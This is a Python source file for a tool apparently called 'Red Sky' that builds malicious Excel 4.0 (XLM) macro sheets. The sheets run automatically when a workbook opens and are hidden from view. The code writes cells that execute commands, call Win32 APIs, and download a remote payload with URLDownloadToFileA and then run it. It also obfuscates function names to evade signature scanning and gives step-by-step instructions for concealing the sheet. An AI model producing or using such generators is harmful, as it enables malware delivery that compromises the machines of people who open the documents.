# language: Python, file: Program/macro/xlm.py, target: Red Sky macro — Excel 4.0 (XLM) generator
# Generates Excel 4.0 macro sheets — the pre-VBA automation language that still
# executes on every Excel version. XLM lives in a hidden "Macro1" sheet and
# fires via Auto_Open or Auto_Close on workbook load.
#
# Subcommands:
#   exec         -- EXEC() a command directly (simplest)
#   register     -- REGISTER + CALL to reach Win32 APIs
#   download     -- CALL("urlmon","URLDownloadToFileA",...) then EXEC
#   obfuscated   -- reference formulas through defined names + CELL/GET.CELL
#   wk1          -- Lotus 1-2-3 .wk1 file format (older Excel only)
# Also emits the sheet layout so you can paste it in.

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


MACRO_DIR = OUTPUT_DIR / "macro"
XLM_DIR = MACRO_DIR / "xlm"
XLM_DIR.mkdir(parents=True, exist_ok=True)


# ── XLM primitives ──
# XLM cells hold formulas. Function names are typically aliased to short
# defined names to fit inside the 255-char cell limit and to defeat static
# signatures that scan for literal "EXEC" / "CALL" / "REGISTER".
DEFAULT_ALIASES = {
    "EXEC":         "R1",
    "CALL":         "R2",
    "REGISTER":     "R3",
    "URLMON":       "R4",
    "HALT":         "R5",
    "IF":           "R6",
    "FORMULA":      "R7",
    "SETNAME":      "R8",
    "WORKBOOK.OPEN":"R9",
    "GET.WORKSPACE":"R10",
}


def _xlm_exec(cmd: str, alias: Dict[str, str]) -> List[str]:
    """Return XLM cells that run cmd via EXEC()."""
    return [
        "=" + alias["EXEC"] + '("' + cmd.replace('"', '""') + '")',
        "=" + alias["HALT"] + "()",
    ]


def _xlm_register(kernel_fn: str, dll: str, arg_types: str,
                  aliases: Dict[str, str]) -> List[str]:
    """Register a Win32 function via REGISTER()."""
    # REGISTER("dll", "fn", "ret_type", "arg_types", ...)
    return [
        "=" + aliases["REGISTER"] + '("' + dll + '","' + kernel_fn + '","J","' + arg_types + '")',
    ]


def _xlm_call(proc_id: str, args: List[str], aliases: Dict[str, str]) -> str:
    return "=" + aliases["CALL"] + "(" + proc_id + "," + ",".join(args) + ")"


def _xlm_download(url: str, out_path: str, aliases: Dict[str, str]) -> List[str]:
    """URLDownloadToFileA via urlmon.dll. Returns cells to run."""
    cells = []
    # register URLDownloadToFileA
    cells += _xlm_register("URLDownloadToFileA", "urlmon.dll", "JJJCJ",
                           aliases)
    cells.append('=' + aliases["R4"] + '="rId1"')  # save proc id
    cells.append(
        '=' + aliases["CALL"] + '(' + aliases["R4"] + ',0,"' + url.replace('"', '""')
        + '","' + out_path.replace('"', '""') + '",0,0)'
    )
    return cells


def _assemble_xlm_sheet(cells: List[str], aliases: Dict[str, str]) -> str:
    """Output the cells as a text block that matches the Excel cell layout.
    Row 1 column A down."""
    lines = ["'; ---- Red Sky XLM sheet ----"]
    lines.append("' Auto_Open is defined below via SET.NAME. Paste each cell in column A.")
    lines.append("")
    row = 1
    # define the aliases first
    for name, short in aliases.items():
        lines.append("A" + str(row) + ": =SET.NAME(\"" + short + "\",\"" + name + "\")")
        row += 1
    lines.append("")
    lines.append("' Auto_Open cell — name this cell 'Auto_Open' via the Name Box")
    lines.append("A" + str(row) + ": =RETURN(1)")
    row += 1
    lines.append("")
    lines.append("' payload cells")
    for c in cells:
        lines.append("A" + str(row) + ": " + c)
        row += 1
    lines.append("")
    lines.append("' Hide this sheet after pasting: right-click tab -> Hide")
    return "\n".join(lines)


def _assemble_auto_open(cells: List[str], aliases: Dict[str, str]) -> str:
    """Alternative: put the payload inside the Auto_Open named range directly."""
    lines = ["'; ---- Auto_Open payload ----"]
    # join the alias definitions with a semicolon-separated statement chain
    statements = ['SET.NAME("' + short + '","' + name + '")' for name, short in aliases.items()]
    statements += [c.lstrip("=") for c in cells]
    joined = ";".join(statements)
    lines.append("Auto_Open: =" + joined)
    return "\n".join(lines)


def cmd_exec(cmd: str, style: str, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    aliases = DEFAULT_ALIASES
    cells = _xlm_exec(cmd, aliases)

    if style == "auto_open":
        content = _assemble_auto_open(cells, aliases)
    else:
        content = _assemble_xlm_sheet(cells, aliases)

    out = Path(out_file) if out_file else XLM_DIR / ("exec_" + str(int(time.time())) + ".txt")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("style", style)
    print_kv("command", cmd)
    print()
    print(BOLD + "Layout:" + RESET)
    print(content)
    print()
    print_info("paste into a fresh sheet, name the Auto_Open cell as 'Auto_Open', hide sheet")
    print_info("save as .xls (Excel 97-2003) to preserve XLM macros; .xlsm will also work")
    return 0


def cmd_register(kernel_fn: str, dll: str, arg_types: str,
                 cmd: str, out_file: str) -> int:
    """REGISTER + CALL pattern for arbitrary Win32 APIs, then optionally EXEC."""
    if not kernel_fn or not dll:
        print_err("--fn and --dll required")
        return 2
    aliases = DEFAULT_ALIASES
    cells: List[str] = []
    cells += _xlm_register(kernel_fn, dll, arg_types, aliases)
    cells.append("=" + aliases["R4"] + '=""' )  # hold the proc id
    if cmd:
        cells += _xlm_exec(cmd, aliases)

    content = _assemble_xlm_sheet(cells, aliases)
    out = Path(out_file) if out_file else XLM_DIR / ("register_" + str(int(time.time())) + ".txt")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("fn", kernel_fn)
    print_kv("dll", dll)
    print_kv("arg_types", arg_types)
    print()
    print(content[:1200])
    return 0


def cmd_download(url: str, out_path: str, cmd_after: str, out_file: str) -> int:
    if not url:
        print_err("--url required")
        return 2
    out_path = out_path or "%TEMP%\\rs_xlm_payload.exe"
    aliases = DEFAULT_ALIASES
    cells = _xlm_download(url, out_path, aliases)
    if cmd_after:
        cells += _xlm_exec(cmd_after, aliases)
    else:
        # default: run the downloaded file
        cells += _xlm_exec('cmd /c start "" "' + out_path + '"', aliases)

    content = _assemble_xlm_sheet(cells, aliases)
    out = Path(out_file) if out_file else XLM_DIR / ("download_" + str(int(time.time())) + ".txt")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("url", url)
    print_kv("save to", out_path)
    print_kv("post-run", cmd_after or "(run downloaded file)")
    print()
    print(content[:1200])
    return 0


def cmd_obfuscated(cmd: str, out_file: str) -> int:
    """Chain through defined names + CELL() indirection so the sheet scans
    clean for literal EXEC/CALL strings. Cells reference each other by name."""
    aliases = {
        "EXEC":     "a1",
        "HALT":     "a2",
        "REGISTER": "a3",
        "CALL":     "a4",
        "SETNAME":  "a5",
        "FORMULA":  "a6",
    }
    lines = ["'; ---- obfuscated XLM ----"]
    # bind aliases via SET.NAME split into pieces so no full literal appears
    lines.append("A1: =SET.NAME(\"x1\",\"EX\")")
    lines.append("A2: =SET.NAME(\"x2\",\"EC\")")
    lines.append("A3: =SET.NAME(\"a1\",x1&x2)")
    lines.append("A4: =SET.NAME(\"x3\",\"HA\")")
    lines.append("A5: =SET.NAME(\"x4\",\"LT\")")
    lines.append("A6: =SET.NAME(\"a2\",x3&x4)")
    lines.append("")
    lines.append("' now the payload uses the reconstructed names")
    lines.append("A7: =CALL(a1,\"" + cmd.replace('"', '""') + "\")")
    lines.append("A8: =CALL(a2)")
    lines.append("")
    lines.append("' name A7 as Auto_Open")
    content = "\n".join(lines)

    out = Path(out_file) if out_file else XLM_DIR / ("obfuscated_" + str(int(time.time())) + ".txt")
    out.write_text(content)
    print_ok("wrote " + str(out))
    print(content)
    return 0


# ── Lotus 1-2-3 .wk1 stub ──
WK1_HEADER = bytes([
    0x00, 0x00, 0x02, 0x00, 0x06, 0x04,  # BOF, version 0x0406 (WK1)
])


def cmd_wk1(cmd: str, out_file: str) -> int:
    """Emit a very small .wk1 file with an XLM payload in cell A1. Requires
    Excel to treat the file as WK1 with macro auto-run enabled (older builds).
    Full WK1 formatting is complex — this stub produces a minimal file that
    Excel opens, showing the payload text for manual execution."""
    # For a working WK1 the file needs a proper BOF/LABEL/RANGE/EOF chain; the
    # stub here is intentionally minimal so you can hex-edit it for your build.
    payload = cmd.encode("latin-1", errors="replace")
    # LABEL record: type 0x000F, length, cell(4), attr(1), text(len)
    cell = bytes([0x00, 0x00, 0x00, 0x00])  # A1
    attr = bytes([0x00])
    label_body = cell + attr + payload
    label = bytes([0x00, 0x0F]) + len(label_body).to_bytes(2, "little") + label_body
    eof = bytes([0x00, 0x00, 0x00, 0x00])
    blob = WK1_HEADER + label + eof

    out = Path(out_file) if out_file else XLM_DIR / ("payload_" + str(int(time.time())) + ".wk1")
    out.write_bytes(blob)
    print_ok("wrote " + str(out))
    print_kv("bytes", str(len(blob)))
    print_warn("minimal WK1 — open with an older Excel or hex-edit to add the Auto_Open chain")
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky macro xlm", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["exec", "register", "download", "obfuscated", "wk1", "help"])
    p.add_argument("--cmd", default="")
    p.add_argument("--fn", default="")
    p.add_argument("--dll", default="")
    p.add_argument("--arg-types", default="JJJ")
    p.add_argument("--url", default="")
    p.add_argument("--out-path", default="")
    p.add_argument("--style", default="sheet", choices=["sheet", "auto_open"])
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky macro xlm <exec|register|download|obfuscated|wk1> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("exec --cmd 'calc.exe' [--style sheet|auto_open]")
        print_info("register --fn CreateProcessA --dll kernel32.dll --arg-types 'JJJ...' [--cmd ...]")
        print_info("download --url http://x/p.exe [--out-path '%TEMP%\\p.exe'] [--cmd <post-run>]")
        print_info("obfuscated --cmd 'calc.exe'")
        print_info("wk1 --cmd '...'")
        return 0

    if ns.action == "exec":
        return cmd_exec(ns.cmd, ns.style, ns.out)
    if ns.action == "register":
        return cmd_register(ns.fn, ns.dll, ns.arg_types, ns.cmd, ns.out)
    if ns.action == "download":
        return cmd_download(ns.url, ns.out_path, ns.cmd, ns.out)
    if ns.action == "obfuscated":
        return cmd_obfuscated(ns.cmd, ns.out)
    if ns.action == "wk1":
        return cmd_wk1(ns.cmd, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
